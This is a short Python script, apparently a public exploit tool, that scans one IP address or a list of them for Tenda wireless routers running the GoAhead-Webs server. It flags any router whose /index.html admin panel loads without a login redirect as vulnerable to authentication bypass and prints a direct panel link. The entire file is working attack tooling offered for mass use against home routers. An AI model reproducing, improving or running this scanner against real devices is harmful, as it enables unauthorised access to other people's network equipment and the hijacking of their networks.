import requests
from bs4 import BeautifulSoup
import argparse
from colorama import Fore, init

init(autoreset=True)

def get_title(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        title = soup.title.string.strip() if soup.title else "No title"
        return title
    except requests.RequestException as e:
        return f"Failed to connect to {url}: {e}"

def get_server(url):
    try:
        response = requests.head(url, timeout=5)
        server = response.headers.get('Server', 'Unknown')
        return server
    except requests.RequestException as e:
        return f"Failed to connect to {url}: {e}"

def test_ip(ip):
    try:
        response = requests.get(ip + '/index.html', timeout=5)
        title = get_title(ip)
        server = get_server(ip)
        if response.status_code == 200 and '/login.html' not in response.url and "Tenda Wireless Router" in title and server == "GoAhead-Webs":
            return True, title, server
        else:
            return False, title, server
    except requests.RequestException as e:
        return False, f"Failed to connect to {ip}: {e}", "Unknown"

def main():
    parser = argparse.ArgumentParser(description="Tenda GoAhead Embedded Web Server Exploit - Auth Bypass")
    parser.add_argument('-u', '--url', help='Test a single IP address')
    parser.add_argument('-l', '--list', help='Test a list of IP addresses in a file')

    args = parser.parse_args()

    if args.url:
        result, title, server = test_ip(args.url)
        if result:
            print(Fore.GREEN + f"VULNERABLE 200 OK - " + Fore.WHITE + title)
            print("PANEL LINK: " + Fore.MAGENTA + f"{args.url}/index.html" + Fore.WHITE)
            print("SERVER: " + Fore.CYAN + server + Fore.WHITE)
        else:
            print(Fore.RED + f"Connection timed out or target not vulnerable." + Fore.WHITE)

    elif args.list:
        with open(args.list, 'r') as file:
            ip_list = file.read().splitlines()

        for ip in ip_list:
            result, title, server = test_ip(ip)
            if result:
                print(f"TARGET-IP: {ip}/index.html, VULNERABLE 200 OK - " + Fore.WHITE + title)
                print("PANEL LINK: " + Fore.MAGENTA + f"{ip}/index.html" + Fore.WHITE)
                print("SERVER: " + Fore.CYAN + server + Fore.WHITE)
            else:
                print(Fore.RED + f"Connection timed out or target is not vulnerable. Title: {title}, Server: {server}" + Fore.WHITE)

    else:
        print("Tenda GoAhead Embedded Web Server - Exploit")
        print("Made by @makaki22")
        print("")
        print("Usage: python exploit.py [-u / --url] [-l / --list]")
        print("Example: python exploit.py -u http://127.0.0.1:8080")

if __name__ == "__main__":
    main()
